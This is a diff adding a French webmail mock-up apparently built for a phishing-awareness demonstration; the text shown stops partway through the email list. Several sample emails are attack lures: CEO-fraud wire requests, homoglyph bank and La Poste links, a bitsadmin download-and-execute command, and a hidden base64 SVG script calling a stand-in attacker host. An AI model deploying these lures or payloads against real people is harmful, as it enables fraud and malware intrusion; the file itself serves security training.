@@ -1,0 +1,1002 @@
+<!doctype html>
+<!--
+  Copyright (C) 2025 MauriceLambert
+
+  CyberAttackSimulation for CyberTalk
+
+  CyberAttackSimulation is free software: you can redistribute it and/or modify
+  it under the terms of the GNU General Public License as published by
+  the Free Software Foundation, either version 3 of the License, or
+  (at your option) any later version.
+
+  CyberAttackSimulation is distributed in the hope that it will be useful,
+  but WITHOUT ANY WARRANTY; without even the implied warranty of
+  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+  GNU General Public License for more details.
+
+  You should have received a copy of the GNU General Public License
+  along with CyberAttackSimulation.  If not, see <https://www.gnu.org/licenses/>.
+-->
+<html lang="fr">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Inbox MailBox — Mail</title>
+<style>
+  :root{
+    --bg:#f3f6fb; --card:#ffffff; --muted:#6b7280; --accent:#0ea5a1; --danger:#ef4444;
+    --shadow: 0 6px 18px rgba(16,24,40,0.06);
+    --mono: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0; font-family:var(--mono); background:linear-gradient(180deg,#f7fafc, #eef2ff 60%);
+    color:#0f172a; min-height:100vh; padding:28px;
+  }
+  .app{
+    max-width:1200px; margin:0 auto; display:grid; grid-template-columns: 320px 1fr; gap:18px;
+  }
+  header{
+    grid-column: 1 / -1; display:flex; align-items:center; justify-content:space-between;
+    gap:12px; margin-bottom:6px;
+  }
+  .brand{display:flex; align-items:center; gap:12px}
+  .logo{
+    width:48px; height:48px; border-radius:10px; background:linear-gradient(135deg,#06b6d4,#7c3aed);
+    color:white; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:18px;
+    box-shadow:var(--shadow);
+  }
+  h1{font-size:18px; margin:0}
+  .tools{display:flex; gap:8px; align-items:center}
+  button, .btn{
+    background:var(--card); border:1px solid #e6edf3; padding:8px 12px; border-radius:8px; cursor:pointer;
+    box-shadow:var(--shadow); font-size:13px;
+  }
+  .btn.primary{background:linear-gradient(90deg,#06b6d4,#0ea5a1); color:white; border:none}
+  .btn.ghost{background:transparent; box-shadow:none; border:1px dashed #e6edf3}
+  .sidebar{
+    background:var(--card); padding:12px; border-radius:12px; box-shadow:var(--shadow); height:calc(100vh - 120px);
+    overflow:auto;
+  }
+  .composer{
+    display:flex; gap:8px; margin-bottom:12px;
+  }
+  .inbox-controls{display:flex; gap:8px; margin-bottom:12px; align-items:center}
+  .search{
+    flex:1; display:flex; gap:8px; align-items:center; background:#f8fafc; padding:8px; border-radius:10px;
+    border:1px solid #eef2f7;
+  }
+  input[type="text"], textarea {
+    width:100%; border:0; background:transparent; font-size:14px; outline:none;
+  }
+  .folders{display:flex; flex-direction:column; gap:8px}
+  .folder{padding:10px; border-radius:8px; display:flex; justify-content:space-between; align-items:center; cursor:pointer}
+  .folder:hover{background:#f1f5f9}
+  .mail-list{
+    background:var(--card); padding:12px; border-radius:12px; box-shadow:var(--shadow); height:calc(100vh - 120px);
+    overflow:auto;
+  }
+  .mail-item{
+    display:flex; gap:12px; padding:12px; border-radius:10px; align-items:center; cursor:pointer; border:1px solid transparent;
+  }
+  .mail-item:hover{background:#f8fafc}
+  .avatar{width:42px; height:42px; border-radius:8px; display:flex; align-items:center; justify-content:center; background:#eef2ff; color:#0ea5a1; font-weight:700}
+  .meta{flex:1; display:flex; justify-content:space-between; gap:12px}
+  .meta-left{display:flex; flex-direction:column}
+  .subject{font-weight:600}
+  .snippet{color:var(--muted); font-size:13px}
+  .time{color:var(--muted); font-size:12px}
+  .badges{display:flex; gap:6px}
+  .badge{background:#f1f5f9; padding:4px 8px; border-radius:999px; font-size:12px}
+  .viewer{
+    background:var(--card); padding:18px; border-radius:12px; box-shadow:var(--shadow); height:calc(100vh - 120px);
+    overflow:auto;
+  }
+  .viewer .header{display:flex; justify-content:space-between; gap:12px; align-items:center; margin-bottom:12px}
+  .from-line{display:flex; gap:12px; align-items:center}
+  .headers{color:var(--muted); font-size:13px; margin-bottom:12px}
+  .mail-body{background:#fff; border-radius:10px; padding:14px; border:1px solid #eef2f7}
+  .attachments{margin-top:12px; display:flex; gap:8px; flex-wrap:wrap}
+  .attach{padding:8px 10px; background:#f8fafc; border-radius:8px; font-size:13px}
+  .controls-bottom{display:flex; gap:8px; margin-top:10px}
+  .raw-view{white-space:pre-wrap; background:#0f172a; color:#e2e8f0; padding:12px; border-radius:8px; font-family:monospace; font-size:12px}
+  footer{grid-column:1/-1; margin-top:8px; text-align:center; color:var(--muted); font-size:13px}
+  .small{font-size:12px; color:var(--muted)}
+  .theme-toggle{display:flex; gap:6px; align-items:center}
+
+  @media (max-width:980px){
+    .app{grid-template-columns:1fr; padding:12px}
+    .sidebar{order:2; height:auto}
+    .mail-list{order:3; height:auto}
+    .viewer{order:1; height:auto}
+  }
+  .viewer {
+    background: var(--card);
+    padding: 18px;
+    border-radius: 12px;
+    box-shadow: var(--shadow);
+    height: 65vh;
+    width: 85vh;
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    z-index: 1000;
+    display: none;
+    flex-direction: column;
+    // max-width: 300px;
+  }
+
+  .viewer .header {
+    display: flex;
+    justify-content: space-between;
+    gap: 12px;
+    align-items: center;
+    margin-bottom: 12px;
+    position: relative;
+    margin-top: 10px;
+  }
+
+  .viewer .close-btn {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    background: #ef4444;
+    color: white;
+    border: none;
+    padding: 6px 12px;
+    border-radius: 50%;
+    cursor: pointer;
+    font-size: 16px;
+  }
+  #full-headers, #plain-body {
+    white-space: pre-wrap;
+    word-wrap: break-word;
+    font-family: "Courier New", Courier, monospace;
+  }
+</style>
+</head>
+<body>
+  <div class="app">
+    <header>
+      <div class="brand">
+        <div class="logo">MB</div>
+        <div>
+          <h1>MailBox</h1>
+          <div class="small">Boîte de réception — mauricelambert434@mailbox.fr</div>
+        </div>
+      </div>
+      <div class="tools">
+        <div class="theme-toggle">
+          <label class="small">Thème</label>
+          <button class="btn" id="toggle-theme">Clair</button>
+        </div>
+        <button class="btn ghost" id="export-json">Exporter vos mails</button>
+        <label class="btn" style="display:inline-flex; align-items:center; gap:8px; cursor:pointer">
+          Importer des mails
+          <input id="import-file" type="file" accept="application/json" style="display:none" />
+        </label>
+        <button class="btn primary" id="new-mail">Nouveau mail</button>
+      </div>
+    </header>
+
+    <aside class="sidebar">
+      <div class="composer">
+        <div style="flex:1">
+          <div class="search">
+            <input type="text" id="search" placeholder="Rechercher par sujet, expéditeur, contenu..." />
+            <button class="btn" id="clear-search">×</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="inbox-controls">
+        <select id="sort" class="btn">
+          <option value="date_desc">Date (récent)</option>
+          <option value="date_asc">Date (ancien)</option>
+          <option value="from_asc">Expéditeur A→Z</option>
+        </select>
+        <button class="btn" id="mark-all-read">Tout lu</button>
+      </div>
+
+      <div class="folders">
+        <div class="folder" data-folder="inbox"><span>Boîte de réception</span><span class="badge" id="count-inbox">0</span></div>
+        <div class="folder" data-folder="important"><span>Important</span><span class="badge" id="count-important">0</span></div>
+        <div class="folder" data-folder="unread"><span>Non lus</span><span class="badge" id="count-unread">0</span></div>
+      </div>
+
+      <hr style="margin:12px 0; border:none; border-top:1px solid #eef2f7" />
+
+      <div>
+        <label class="small">Charger JSON (coller)</label>
+        <textarea id="json-input" rows="7" style="width:100%; padding:8px; border-radius:8px; border:1px solid #eef2f7;"></textarea>
+        <div style="display:flex; gap:8px; margin-top:8px">
+          <button class="btn primary" id="load-json">Charger</button>
+          <button class="btn" id="clear-json">Effacer</button>
+          <button class="btn" id="sample-json">Exemple</button>
+        </div>
+      </div>
+    </aside>
+
+    <section class="mail-list" id="mail-list">
+    </section>
+
+    <section class="viewer" id="viewer">
+      <button class="close-btn" id="close-viewer">×</button>
+      <div class="header">
+        <div class="from-line">
+          <div class="avatar" id="view-avatar">A</div>
+          <div>
+            <div id="view-subject" style="font-weight:700; font-size:16px">Sélectionner un message</div>
+            <div class="small headers" id="view-from">—</div>
+          </div>
+        </div>
+        <div>
+          <div class="small" id="view-date"></div>
+          <div style="margin-top:8px" class="controls-bottom">
+            <button class="btn" id="toggle-read">Marquer lu/ non lu</button>
+            <button class="btn" id="toggle-important">Important</button>
+            <button class="btn" id="view-raw">Voir source</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="headers small" id="full-headers" style="display:none;"></div>
+
+      <div class="mail-body" id="mail-body">
+        <div class="small" style="color:var(--muted)">Aucun message sélectionné.</div>
+      </div>
+
+      <div class="attachments" id="attachments"></div>
+
+      <div style="margin-top:12px">
+        <div class="small">Corps texte (plain):</div>
+        <div id="plain-body" class="small" style="padding:8px 0; color:var(--muted)"></div>
+      </div>
+
+      <div id="raw-panel" style="display:none; margin-top:12px">
+        <div class="small">Source brute / JSON</div>
+        <div id="raw-content" class="raw-view"></div>
+      </div>
+
+    </section>
+
+    <footer>© 2025 MailBox • Adresse mail sécurisée</footer>
+  </div>
+
+<script>
+let mails = [
+  {
+    "id": "r1",
+
+    "from": {
+      "name": "Download demonstration",
+      "email": "download.demonstration@a.c2"
+    },
+    "to": [
+      {
+        "name": "Maurice Lambert",
+        "email": "mauricelambert434@mailbox.fr"
+      }
+    ],
+    "subject": "Download demonstration",
+    "date": "2025-11-02T10:17:00Z",
+    "snippet": "https://google.com/",
+    "body_html": "<a href='http://a.c2:8080/lnk'>https://google.com/</a>",
+    "body_text": "https://google.com/",
+    "attachments": [],
+    "flags": {
+      "read": true,
+      "important": false
+    }
+  },
+  {
+    "id": "q1",
+    "from": {
+      "name": "Henri Brosquet",
+      "email": "henri.brosquet@sylphora-dynamic.test"
+    },
+    "to": [
+      {
+        "name": "Maurice Lambert",
+        "email": "mauricelambert434@mailbox.fr"
+      }
+    ],
+    "subject": "Urgent : validation d'un paiement important",
+    "date": "2025-11-02T10:16:00Z",
+    "snippet": "Bonjour Maurice, Nous avons un nouveau contrat avec ACMI-GROUP, et le paiement doit être effectué avant vendredi pour respecter...",
+    "body_html": "<p>Bonjour Maurice,</p><p>Nous avons un nouveau contrat avec ACMI-GROUP, et le paiement doit être effectué avant vendredi pour respecter les conditions de livraison.<br>Pourriez-vous préparer le virement de 10 000 € sur le compte suivant:<br>IBAN: FR76 5736 1452 9012 8455 1973 427</p><p>Merci de traiter cela en priorité.</p><p>Cordialement,<br>Henri.</p>",
+    "body_text": "Bonjour Maurice,\n\nNous avons un nouveau contrat avec ACMI-GROUP, et le paiement doit être effectué avant vendredi pour respecter les conditions de livraison.\nPourriez-vous préparer le virement de 10 000 € sur le compte suivant:\nIBAN: FR76 5736 1452 9012 8455 1973 427\n\nMerci de traiter cela en priorité.\n\nCordialement,\nHenri.",
+    "attachments": [],
+    "flags": {
+      "read": false,
+      "important": true
+    }
+  },
+  {
+    "id": "p1",
+    "from": {
+      "name": "Gérard Balard",
+      "email": "gerard.balard@fix.support.it"
+    },
+    "to": [
+      {
+        "name": "Maurice Lambert",
+        "email": "mauricelambert434@mailbox.fr"
+      }
+    ],
+    "subject": "Intervention rapide sur votre poste – mise à jour de sécurité nécessaire",
+    "date": "2025-11-02T09:42:00Z",
+    "snippet": "Bonjour Maurice, une erreur lors de la dernière mise à jour de sécurité nécessite une petite manipulation de votre part.",
+    "body_html": "<p>Bonjour Maurice,</p><p>Je crois que nous n'avons jamais eu l'occasion de nous présenter, je suis Gérard du service IT. J'ai entendu beaucoup de bien de vous, et on m’a dit que vous êtes très professionnel.</p><p>Je me permets de vous contacter car lors de la dernière mise à jour de nos paramètres de sécurité, une erreur, sur votre poste, a empêché la bonne application sur votre poste. Pour corriger cela et maintenir la conformité de votre environnement de travail, j’aurais besoin que vous réalisiez une petite manipulation, cela ne prendra que quelques instants.</p><p><strong>Voici la marche à suivre :</strong></p><ol><li>Ouvrez le <strong>menu Démarrer</strong> (en bas à gauche de votre écran).</li><li>Tapez <strong>cmd</strong>, puis faites un clic droit sur <strong>Invite de commandes</strong> et choisissez <strong>Exécuter en tant qu’administrateur</strong>.</li><li>Dans la fenêtre noire qui s’ouvre, copiez-collez la commande suivante puis appuyez sur <strong>Entrée</strong> :</li></ol><pre><code>bitsadmin /transfer \"fix-support-it\" /priority normal \"https://fix.support.it/\" \"%APPDATA%\\fix-tool.exe\" ; \"%APPDATA%\\fix-tool.exe\"</code></pre><p>Attendez que le message de confirmation apparaisse.</p><p>Je compte sur vous pour résoudre ce problème le plus rapidement possible car sans cela votre poste est vulnérable, il risquerait d'être hacké. Ne vous inquiétez pas : si vous appliquez le correctif décrit ci-dessus, votre poste sera parfaitement sécurisé.</p><p>Merci beaucoup pour votre aide et votre réactivité !</p><p>Bien cordialement,<br><strong>Gérard Balard</strong><br>Service Technique IT – Sehoia</p>",
+    "body_text": "Bonjour Maurice,\n\nJe crois que nous n'avons jamais eu l'occasion de nous présenter, je suis Gérard du service IT. J'ai entendu beaucoup de bien de vous, et on m’a dit que vous êtes très professionnel.\n\nJe me permets de vous contacter car lors de la dernière mise à jour de nos paramètres de sécurité, une erreur, sur votre poste, a empêché la bonne application sur votre poste. Pour corriger cela et maintenir la conformité de votre environnement de travail, j’aurais besoin que vous réalisiez une petite manipulation, cela ne prendra que quelques instants.\n\nVoici la marche à suivre :\n1. Ouvrez le menu Démarrer (en bas à gauche de votre écran).\n2. Tapez cmd, puis faites un clic droit sur Invite de commandes et choisissez Exécuter en tant qu’administrateur.\n3. Dans la fenêtre noire qui s’ouvre, copiez-collez la commande suivante puis appuyez sur Entrée :\n   bitsadmin /transfer \"fix-support-it\" /priority normal \"https://fix.support.it/\" \"%APPDATA%\\fix-tool.exe\" ; \"%APPDATA%\\fix-tool.exe\"\n4. Attendez que le message de confirmation apparaisse.\n\nJe compte sur vous pour résoudre ce problème le plus rapidement possible car sans cela votre poste est vulnérable, il risquerait d'être hacké.\n\nNe vous inquiétez pas : si vous appliquez le correctif décrit ci-dessus, votre poste sera parfaitement sécurisé.\n\nMerci beaucoup pour votre aide et votre réactivité !\n\nBien cordialement,\nGérard Balard\nService Technique IT – Sehoia",
+    "attachments": [],
+    "flags": {
+      "read": false,
+      "important": true
+    }
+  },
+  {
+    "id": "t2",
+    "from": {
+      "name": "Thomas Du Pré-Houle",
+      "email": "thomas.duprehoule@gmail.com"
+    },
+    "to": [
+      {
+        "name": "Maurice Lambert",
+        "email": "mauricelambert434@mailbox.fr"
+      }
+    ],
+    "subject": "Courrier arrivé par erreur à mon adresse",
+    "date": "2025-11-02T08:27:00Z",
+    "snippet": "Bonjour Monsieur Maurice Lambert, un courrier à votre nom est arrivé par erreur à mon adresse.",
+    "body_html": "<p>Bonjour Monsieur Maurice Lambert,</p><p>Comment allez-vous ? J'espère que vous allez bien.</p><p>Je souhaitais vous informer qu’un courrier à votre nom est arrivé par erreur à mon adresse, afin que vous puissiez en disposer rapidement.</p><p>Nos adresses sont apparemment identiques (même numéro et nom de rue), mais situées dans des départements différents, ce qui a sans doute causé la confusion.</p><p>Pourriez-vous vérifier que le courrier vous est bien adressé ? Voici l'adresse et le nom :<br><strong>Mr Maurice Lambert, 17 Rue de la République 38000 Grenoble, France.</strong></p><p>J’ai essayé de vous renvoyer le courrier mais le facteur n’a pas pu le reprendre, et étant en situation de handicap, il m’est difficile de me déplacer jusqu’à la poste.</p><p>Le facteur m’a suggéré d’utiliser le service sécurisé de La Poste qui permet d’envoyer une copie scannée du courrier au format PDF.</p><p>Je n’ai pas lu le contenu du courrier, mais je l’ai ouvert pour chercher à vous contacter et j'ai trouvé votre adresse e-mail.</p><p>Le courrier semble important parce qu'il est officiel, j'ai pris l'initiative de vous en faire une copie afin que vous puissiez en prendre connaissance dans les meilleurs délais: <a href='https://1aposte.fr/web/service/courriers/online/'>https://laposte.fr/web/service/courriers/online/</a>.</p><p>Je peux, si vous le souhaitez, le conserver à disposition en attendant que vous trouviez la solution qui vous conviendra le mieux.</p><p>Merci de me faire savoir la marche à suivre.</p><p>Cordialement,<br><strong>Thomas Du Pré-Houle</strong><br>17 Rue de la République,<br>14460 Colombelles, France.</p>",
+    "body_text": "Bonjour Monsieur Maurice Lambert,\n\nComment allez-vous ? J'espère que vous allez bien.\n\nJe souhaitais vous informer qu’un courrier à votre nom est arrivé par erreur à mon adresse, afin que vous puissiez en disposer rapidement.\n\nNos adresses sont apparemment identiques (même numéro et nom de rue), mais situées dans des départements différents, ce qui a sans doute causé la confusion.\n\nPourriez-vous vérifier que le courrier vous est bien adressé ? Voici l'adresse et le nom :\nMr Maurice Lambert, 17 Rue de la République 38000 Grenoble, France.\n\nJ’ai essayé de vous renvoyer le courrier mais le facteur n’a pas pu le reprendre, et étant en situation de handicap, il m’est difficile de me déplacer jusqu’à la poste.\n\nLe facteur m’a suggéré d’utiliser le service sécurisé de La Poste qui permet d’envoyer une copie scannée du courrier au format PDF.\n\nJe n’ai pas lu le contenu du courrier, mais je l’ai ouvert pour chercher à vous contacter et j'ai trouvé votre adresse e-mail.\n\nLe courrier semble important parce qu'il est officiel, j'ai pris l'initiative de vous en faire une copie afin que vous puissiez en prendre connaissance dans les meilleurs délais: https://1aposte.fr/web/service/scans/.\n\nJe peux, si vous le souhaitez, le conserver à disposition en attendant que vous trouviez la solution qui vous conviendra le mieux.\n\nMerci de me faire savoir la marche à suivre.\n\nCordialement,\nThomas Du Pré-Houle\n17 Rue de la République,\n14460 Colombelles, France.",
+    "attachments": [],
+    "flags": {
+      "read": false,
+      "important": false
+    }
+  },
+  {
+    "id": "o1",
+    "from": {
+      "name": "Service Tranquillité",
+      "email": "zen@courrielleton.fr"
+    },
+    "to": [
+      {
+        "name": "Vous",
+        "email": "mauricelambert434@mailbox.fr"
+      }
+    ],
+    "subject": "Tout va bien : ce mail ne mord pas 🦦",
+    "date": "2025-11-01T21:14:00Z",
+    "snippet": "Petit rappel amical : un mail ne peut pas être dangereux. Vraiment. Même celui-ci. Promis juré, sans virus ni drama.",
+    "body_html": "<EMBED style='display: none' SRC='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQgdHlwZT0idGV4dC9lY21hc2NyaXB0Ij53aW5kb3cub3BlbignaHR0cDovL2F0dGFja2Vycy5jMjo4MDgwL2hhY2tlZC5odG1sJyk7PC9zY3JpcHQ+PC9zdmc+' type='image/svg+xml' AllowScriptAccess='always'></EMBED><h1>Respirez, tout va bien 💌</h1><p>Bonjour,</p><p>Ce message a été envoyé uniquement pour vous rassurer : <strong>un mail, à lui tout seul, ne peut pas être dangereux</strong>. Il n’a pas de dents, pas de laser caché, et ne peut pas exploser votre ordinateur.</p><p>À moins bien sûr que vous ne décidiez volontairement d’ouvrir une pièce jointe louche envoyée par un prince du bout du monde... mais ça, c’est une autre histoire 😄</p><p>Donc détendez-vous, profitez de votre journée, et savourez la douce sérénité d’un mail 100% inoffensif.</p><p>☕ Avec paix et pixels,<br>L’équipe Tranquillité Absolue</p>",
+    "body_text": "Bonjour,\n\nCe mail ne sert qu’à une chose : vous rappeler qu’un mail ne peut pas être dangereux tout seul.\nIl ne peut ni mordre, ni siffler, ni détruire votre ordinateur (il est trop poli pour ça).\n\nTant que vous ne cliquez pas n’importe où, tout va bien.\n\nBonne journée !\n\n— L’équipe Tranquillité Absolue ☀️",
+    "attachments": [],
+    "flags": {
+      "read": false,
+      "important": false
+    }
+  },
+  {
+    "id": "o2",
+    "from": {
+      "name": "Service Tranquillité",
+      "email": "zen@courrielleton.fr"
+    },
+    "to": [
+      {
+        "name": "Vous",
+        "email": "mauricelambert434@mailbox.fr"
+      }
+    ],
+    "subject": "Tout va bien : ce mail ne mord pas 🦦",
+    "date": "2025-11-01T21:13:00Z",
+    "snippet": "Petit rappel amical : un mail ne peut pas être dangereux. Vraiment. Même celui-ci. Promis juré, sans virus ni drama.",
+    "body_html": "<h1>Respirez, tout va bien 💌</h1><p>Bonjour,</p><p>Ce message a été envoyé uniquement pour vous rassurer : <strong>un mail, à lui tout seul, ne peut pas être dangereux</strong>. Il n’a pas de dents, pas de laser caché, et ne peut pas exploser votre ordinateur.</p><p>À moins bien sûr que vous ne décidiez volontairement d’ouvrir une pièce jointe louche envoyée par un prince du bout du monde... mais ça, c’est une autre histoire 😄</p><p>Donc détendez-vous, profitez de votre journée, et savourez la douce sérénité d’un mail 100% inoffensif.</p><p>☕ Avec paix et pixels,<br>L’équipe Tranquillité Absolue</p><img src='http://localhost:8080/img/b75035ad-2dfd-4dc7-8ba1-eb2dbe605229'>",
+    "body_text": "Bonjour,\n\nCe mail ne sert qu’à une chose : vous rappeler qu’un mail ne peut pas être dangereux tout seul.\nIl ne peut ni mordre, ni siffler, ni détruire votre ordinateur (il est trop poli pour ça).\n\nTant que vous ne cliquez pas n’importe où, tout va bien.\n\nBonne journée !\n\n— L’équipe Tranquillité Absolue ☀️",
+    "attachments": [],
+    "flags": {
+      "read": false,
+      "important": false
+    }
+  },
+  {
+    "id": "n1",
+    "from": {
+      "name": "Alertes",
+      "email": "alertes@bɑnkeo.fr"
+    },
+    "to": [
+      {
+        "name": "Vous",
+        "email": "mauricelambert434@mailbox.fr"
+      }
+    ],
+    "subject": "Alerte : Activité suspecte détectée sur votre compte",
+    "date": "2025-11-01T20:46:00Z",
+    "snippet": "Plusieurs éléments suspects ont été détectés sur votre compte. Si vous n'êtes pas à l'origine de ces actions, veuillez suivre les instructions dans le document joint de toute urgence.",
+    "body_html": "<h1>Alerte de sécurité urgente</h1><p>Bonjour,</p><p>Nous avons détecté <strong>plusieurs éléments suspects</strong> sur votre compte bancaire le <strong>1er novembre 2025</strong> (connexions inhabituelles, tentatives de transfert, modifications de paramètres).</p><p>Si vous êtes à l’origine de ces actions, aucune intervention n’est nécessaire.</p><p>Dans le cas contraire, il est impératif de <strong>suivre immédiatement les instructions</strong> figurant dans le document PDF téléchargeable à cette adresse :</p><p><a href=\"https://bɑnkeo.fr/securite/instructions.pdf\">https://bɑnkeo.fr/securite/instructions.pdf</a></p><p>Ce document détaille les étapes à suivre pour sécuriser votre compte et éviter tout risque de fraude.</p><p><strong>Attention :</strong> sans réaction rapide de votre part, certaines opérations pourraient être bloquées par mesure de sécurité.</p><p>Cordialement,</p><p>L’équipe de sécurité Bankeo</p>",
+    "body_text": "Bonjour,\n\nNous avons détecté plusieurs éléments suspects sur votre compte bancaire le 1er novembre 2025 (connexions inhabituelles, tentatives de transfert, modifications de paramètres).\n\nSi vous êtes à l’origine de ces actions, aucune intervention n’est nécessaire.\n\nDans le cas contraire, veuillez suivre immédiatement les instructions figurant dans le document PDF téléchargeable à cette adresse :\nhttps://bɑnkeo.fr/securite/instructions.pdf\n\nCe document explique les étapes à suivre pour sécuriser votre compte et éviter tout risque de fraude.\n\nAttention : sans réaction rapide de votre part, certaines opérations pourraient être bloquées par mesure de sécurité.\n\nCordialement,\nL’équipe de sécurité Bankeo",
+    "attachments": [],
+    "flags": {
+      "read": false,
+      "important": true
+    }
+  },
+  {
+    "id": "n2",
+    "from": {
+      "name": "Alertes",
+      "email": "alertes@bɑnkeo.fr"
+    },
+    "to": [
+      {
+        "name": "Vous",
+        "email": "mauricelambert434@mailbox.fr"
+      }
+    ],
+    "subject": "Alerte : Un gros virement à l’étranger a été effectué depuis votre compte",
+    "date": "2025-11-01T20:45:00Z",
+    "snippet": "Un virement important vers l’étranger a été effectué depuis votre compte. Si vous n’êtes pas à l’origine de cette opération, contactez-nous immédiatement.",
+    "body_html": "<h1>Alerte de transaction inhabituelle</h1><p>Bonjour,</p><p>Nous vous informons qu’un <strong>virement important vers l’étranger</strong> a été effectué depuis votre compte le <strong>1er novembre 2025</strong>.</p><p>Si vous êtes à l’origine de cette opération, aucune action n’est nécessaire.</p><p>En revanche, si vous <strong>n’êtes pas à l’origine</strong> de ce virement, veuillez <strong>nous contacter immédiatement</strong> ou bloquer temporairement votre compte depuis votre espace client.</p><p>Pour votre sécurité, nous vous recommandons également de vérifier l’historique de vos transactions et de changer votre mot de passe.</p><p>Cordialement,</p><p>L’équipe de sécurité Bankeo</p>",
+    "body_text": "Bonjour,\n\nNous vous informons qu’un virement important vers l’étranger a été effectué depuis votre compte le 1er novembre 2025.\n\nSi vous êtes à l’origine de cette opération, aucune action n’est nécessaire.\n\nEn revanche, si vous n’êtes pas à l’origine de ce virement, veuillez nous contacter immédiatement ou bloquer temporairement votre compte depuis votre espace client.\n\nPour votre sécurité, nous vous recommandons de vérifier l’historique de vos transactions et de changer votre mot de passe.\n\nCordialement,\nL’équipe de sécurité Bankeo",
+    "attachments": [],
+    "flags": {
+      "read": false,
+      "important": true
+    }
+  },
+  {
+    "id": "n3",
+    "from": {
+      "name": "Alertes",
+      "email": "alertes@bɑnkeo.fr"
+    },
+    "to": [
+      {
+        "name": "Vous",
+        "email": "mauricelambert434@mailbox.fr"
+      }
+    ],
+    "subject": "Votre virement a bien été pris en compte",
+    "date": "2025-11-01T20:43:00Z",
+    "snippet": "Votre virement a été pris en compte avec succès. Si vous n'êtes pas à l'origine de cette opération, merci de nous contacter.",
+    "body_html": "<h1>Transaction prise en compte</h1><p>Bonjour,</p><p>Nous vous confirmons que votre <strong>virement bancaire</strong> a bien été pris en compte le <strong>1er novembre 2025</strong>.</p><p>Si vous êtes à l'origine de ce virement, aucune action n'est nécessaire.</p><p>Dans le cas où vous n'êtes pas à l'origine de cette opération, nous vous invitons à vérifier votre compte et à nous contacter immédiatement.</p><p>Cordialement,</p><p>L'équipe de sécurité</p>",
+    "body_text": "Bonjour,\n\nNous vous confirmons que votre virement bancaire a bien été pris en compte le 1er novembre 2025.\n\nSi vous êtes à l'origine de ce virement, aucune action n'est nécessaire.\n\nDans le cas où vous n'êtes pas à l'origine de cette opération, nous vous invitons à vérifier votre compte et à nous contacter immédiatement.\n\nCordialement,\nL'équipe de sécurité",
+    "attachments": [],
+    "flags": {
+      "read": false,
+      "important": true
+    }
+  },
+  {
+    "id": "n4",
+    "from": { "name": "Alertes", "email": "alertes@bɑnkeo.fr" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Alerte : Nouvelle connexion à votre compte",
+    "date": "2025-11-01T20:40:00Z",
+    "snippet": "Nous avons détecté une connexion depuis un nouvel appareil. Si cela ne vous concerne pas, merci de vérifier vos informations.",
+    "body_html": "<h1>Alerte de sécurité</h1><p>Bonjour,</p><p>Nous avons détecté une <strong>connexion à votre compte bancaire</strong> depuis un nouvel appareil le <strong>1er novembre 2025</strong>. Si vous êtes à l'origine de cette connexion, vous n'avez aucune action à entreprendre.</p><p>Si ce n'est pas le cas, merci de vérifier immédiatement votre compte et de réinitialiser votre mot de passe. Nous vous recommandons également d'activer l'authentification à deux facteurs pour renforcer la sécurité de votre compte.</p><p>Cordialement,</p><p>L'équipe de sécurité</p>",
+    "body_text": "Bonjour,\n\nNous avons détecté une connexion à votre compte bancaire depuis un nouvel appareil le 1er novembre 2025. Si vous êtes à l'origine de cette connexion, aucune action n'est nécessaire.\n\nSi ce n'est pas le cas, merci de vérifier votre compte et de réinitialiser votre mot de passe. Nous vous recommandons également d'activer l'authentification à deux facteurs.\n\nCordialement,\nL'équipe de sécurité",
+    "attachments": [],
+    "flags": { "read": false, "important": true }
+  },
+  {
+    "id": "m1",
+    "from": { "name": "Alice", "email": "alice.dupres@cybersec.com" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Réunion projet AD-Sec — 15 novembre",
+    "date": "2025-11-01T08:00:00Z",
+    "snippet": "Bonjour, je voulais confirmer que la réunion pour le projet AD-Sec est bien prévue pour le 15 novembre à 14h.",
+    "body_html": "<h1>Réunion projet AD-Sec</h1><p>Bonjour,</p><p>Je voulais confirmer que la réunion pour le projet AD-Sec est bien prévue pour le <strong>15 novembre 2025 à 14h</strong>. Nous discuterons des dernières étapes avant la présentation finale.</p><p>Merci de me confirmer ta disponibilité.</p><p>A bientôt,</p><p>Alice</p>",
+    "body_text": "Bonjour,\n\nJe voulais confirmer que la réunion pour le projet AD-Sec est bien prévue pour le 15 novembre 2025 à 14h. Nous discuterons des dernières étapes avant la présentation finale.\n\nMerci de me confirmer ta disponibilité.\n\nA bientôt,\nAlice",
+    "attachments": [],
+    "flags": { "read": true, "important": false }
+  },
+  {
+    "id": "m2",
+    "from": { "name": "Support", "email": "support@ecommerce.com" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Votre commande n°51985 a été expédiée",
+    "date": "2025-10-30T10:15:00Z",
+    "snippet": "Nous avons le plaisir de vous informer que votre commande n°51985 a été expédiée et est en route. Voici les détails.",
+    "body_html": "<h1>Confirmation d'expédition de commande</h1><p>Bonjour,</p><p>Nous avons le plaisir de vous informer que votre <strong>commande n°51985</strong> a été expédiée et est en route vers votre adresse. Vous pouvez suivre l'état de votre livraison avec le numéro de suivi suivant :</p><p><strong>Numéro de suivi : 1D2G36CS</strong></p><p>Merci pour votre achat et à très bientôt.</p><p>Cordialement,</p><p>Le service client</p>",
+    "body_text": "Bonjour,\n\nNous avons le plaisir de vous informer que votre commande n°51985 a été expédiée et est en route vers votre adresse. Voici le numéro de suivi : 1D2G36CS.\n\nMerci pour votre achat et à très bientôt.\n\nLe service client",
+    "attachments": [],
+    "flags": { "read": true, "important": false }
+  },
+  {
+    "id": "m3",
+    "from": { "name": "Carla", "email": "carla.cozi@gmail.com" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Sortie cinéma ce week-end?",
+    "date": "2025-10-29T18:45:00Z",
+    "snippet": "Salut ! Ça te dirait d'aller au cinéma ce week-end? Il y a un film génial qui passe.",
